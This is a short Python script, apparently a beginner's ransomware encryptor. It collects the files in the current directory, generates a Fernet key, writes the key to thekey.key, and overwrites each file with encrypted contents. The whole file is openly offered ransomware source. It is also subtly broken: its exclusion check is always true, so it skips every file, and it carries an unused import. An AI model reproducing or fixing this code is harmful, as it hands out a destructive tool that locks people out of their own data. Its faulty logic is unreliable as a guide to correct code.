#Import operating system library and Fernet (a symmetric encryption method)
from importlib.resources import contents
import os
from cryptography.fernet import Fernet

#Create empty list to store files in
files = []

#Create for loop to discover all files (not directories) in the current directory and add them to the files list
for file in os.listdir():
    #Filter out ransomencrypt.py and thekey.key so they are not added to the files list and encryped
    if file == "ransomencrypt.py" or "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

#Generate key and assign it to variable "key"
key = Fernet.generate_key()

#Save generated key to file, wb for "write binary"
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#Encrypt all files in files list
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

